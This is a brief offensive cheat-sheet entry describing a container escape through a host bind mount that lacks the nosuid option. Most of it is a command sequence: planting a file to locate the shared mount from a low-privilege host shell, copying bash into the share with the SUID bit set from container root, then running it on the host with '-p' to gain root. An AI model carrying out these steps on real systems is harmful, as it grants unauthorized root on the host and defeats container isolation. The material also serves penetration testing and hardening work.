# Bind-Mount Container Escape (missing nosuid)

If a container has a directory bind-mounted from the host and the mount lacks `nosuid`, a SUID binary planted inside the container is honored on the host too.

```bash
# inside the container, as root:
echo hello > /mnt/share/breadcrumb
# on the host (once you have a lower-priv shell there), locate the same mount:
find / -type f -name breadcrumb 2>/dev/null
# back inside the container:
cp /bin/bash /mnt/share/bash && chmod +sx /mnt/share/bash
# on the host:
/path/to/share/bash -p   # SUID bash, euid root
```
